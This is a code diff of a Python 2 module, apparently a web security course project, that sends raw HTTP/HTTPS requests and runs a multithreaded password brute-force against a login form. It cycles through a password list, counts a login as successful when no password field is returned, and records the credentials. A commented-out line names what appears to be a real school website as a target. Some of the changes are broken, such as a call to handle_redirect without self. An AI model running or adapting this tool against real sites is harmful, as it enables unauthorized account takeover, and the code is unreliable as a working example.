@@ -6,13 +6,14 @@ import socket
 from urlparse import urlparse
 from bs4 import BeautifulSoup
 from postInfo import postInfo
+from ssl import wrap_socket
 
 attempts = []
 success = False
 login_cred = ""
-
 class Requester:
-    pattern = re.compile("([3-5]..)")
+    attempt_values = []
+    pattern = re.compile("([4-5]..)")
     host = ""
     user_agent = "CSE361-KappaBot"
     const = ("GET {0} HTTP/1.1\r\n"
@@ -23,18 +24,26 @@ class Requester:
                     "Accept-Language: en-US\r\n"
                     "Connection: Keep-Alive\r\n")
     def __init__(self, domain):
-        self.host = domain.replace('http://', '')
+        parsed_domain = urlparse(domain)
+        self.host = parsed_domain.netloc
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.settimeout(1)
         # Handle if connection not made
-        self.sock.connect((self.host, 80))
+        if parsed_domain.scheme.lower() == "https":
+            self.sock = wrap_socket(self.sock)
+            self.sock.connect((self.host, 443))
+        else:
+            self.sock.connect((self.host, 80))
         if self.sock == -1:
             print -1
+        else:
+            print "Successful Connection"
 
     def __del__(self):
         self.sock.close()
 
     def get(self, url, cookies=None):
+        print "GET CALLED" + url
         # path =  url[url.find('/')+1:]
         # path = path[path.find('/')+1:]
         # path = path[path.find('/'):]
@@ -71,6 +80,7 @@ class Requester:
             #else if field[0] == 'Transfer-Encoding':
             #    if field[1] == 'chunked':
         #Parse Cookies
+        print response_header
         cookies = {}
         for field in response_header.split('\n'):
             if "Set-Cookie:" in  field:
@@ -83,8 +93,8 @@ class Requester:
         #Handle Error Codes
         if(self.pattern.match(status_code)):
             return -1
-
         self.sock.send(header)
+        print header
         current_amount = len(response)
         #while current_amount < total:
         try:
@@ -96,7 +106,9 @@ class Requester:
         except:
             #find HTML or html
             response = response[:response.find('</html>')+7]
-
+        redirect = self.handle_redirect(response_header, cookies)
+        if redirect:
+            response = redirect
         #Return Object:
         # URL
         # cookies
@@ -109,14 +121,15 @@ class Requester:
     def post(self, info, fields):
         #iterating through fields and adding to body of post
         #field dictionary in post
+        print info.url
         path = urlparse(info.url).path
+        print "PATH " + str(path)
         # Build request body
         body = ""
         for key in fields.keys():
             body += "&"
             body += str(key) + "=" + str(fields[key])
         body = body[1:]
-
         header = ("POST {} HTTP/1.1\r\n"
                 "Host: {}\r\n"
                 "User-Agent: {}\r\n"
@@ -134,7 +147,6 @@ class Requester:
         header += "\r\n"
         header += body + "\r\n\r\n"
         # print header
-        #print header
         response = ""
         try:
             self.sock.send(header)
@@ -147,39 +159,40 @@ class Requester:
             if response.find("<html>") != -1:
                 response = response[:response.find('</html>')+7]
             #print response
-            return response
+        redirect = handle_redirect(response, info.cookies)
+        if redirect:
+            response = redirect
 
-    def ATTACK(self, low, high, info, query, passwords):
+        return response
+
+    def ATTACK(self, low, high, info, query, passwords, password_field):
         global attempts
         global success
         global login_cred
-        status = re.compile('3\d{2}')
+        global list_lock
         for i in range(low,high):
             print success
             if success:
                 return None
-            query["password"] = passwords[i]
-            attempts.append(query)
+            query[password_field] = passwords[i]
+            print query
+            attempts.append(query.copy())
             r = Requester(self.host)
             response = r.post(info, query)
-            response_code = response.splitlines()[0]
-            redirect = status.search(response_code)
-            if redirect:
-                new_host_index = response.find("Location: ") + len("Location: ")
-                new_host_end = response[new_host_index:].find('\n') + new_host_index
-                new_host = response[new_host_index:new_host_end]
-                new_host = urlparse(new_host).path
-                new_host = 'http://' + r.host + '/' + new_host
-                response = r.get(new_host, cookies=info.cookies)
-                #print response.response_body
+            print response
+            redirect = self.handle_redirect(response)
+            #print response.response_body
             #If response is redirect (3**) then call get on the url at location: xxxx
             #Else its probably js and just check the page returned for password
-            soup = BeautifulSoup(response.response_body, "html.parser")
+            if redirect:
+                soup = BeautifulSoup(redirect.response_body, "html.parser")
+            else:
+                soup = BeautifulSoup(response, "html.parser")
             if soup.findAll(type ="password"):
                 #False if Login successful(supposedly)
                 continue
             else:
-                login_cred = query 
+                login_cred = query
                 success = True
         return None
 
@@ -187,11 +200,14 @@ class Requester:
 #Unsuccessful Bruteforces return null
     def bruteForce(self, url, username, keywords, action, login_field, password_field):
         #r = Requester(url)
+        global attempts
         print "URL "+str(url)
         info  = self.get(url)
         print info.url
         #Assume action doesnt have a slash
-        info.url = info.url+action[1:]
+        if action[0] == '/':
+            action = action[1:]
+        info.url = info.url+action
         #Attempt to login
         query = {}
         #Only works for one username
@@ -200,12 +216,28 @@ class Requester:
         for i in range(4):
             low = (len(keywords)/4)*i
             high = (len(keywords)/4)*(i+1)
-            threads.append(Thread(target=self.ATTACK, args=(low, high, info, {login_field:username}, keywords)))
+            threads.append(Thread(target=self.ATTACK, args=(low, high, info, {login_field:username}, keywords, password_field)))
             threads[i].start()
         for t in threads:
             t.join()
-        return login_cred 
-    
+        self.attempt_values = attempts
+        print attempts
+        return login_cred
+
+    def handle_redirect(self, response, cookies= None):
+        status = re.compile('3\d{2}')
+        response_code = response.splitlines()[0]
+        redirect = status.search(response_code)
+        if redirect:
+            new_host_index = response.find("Location: ") + len("Location: ")
+            new_host_end = response[new_host_index:].find('\n') + new_host_index
+            new_host = response[new_host_index:new_host_end]
+            new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            new_sock.settimeout(1)
+            if self.host == urlparse(new_host).netloc:
+                new_response = self.get(new_host, cookies)
+                return new_response.response_body
+        return False
 
 
 #path = 'http://austinchildrensacademy.org'
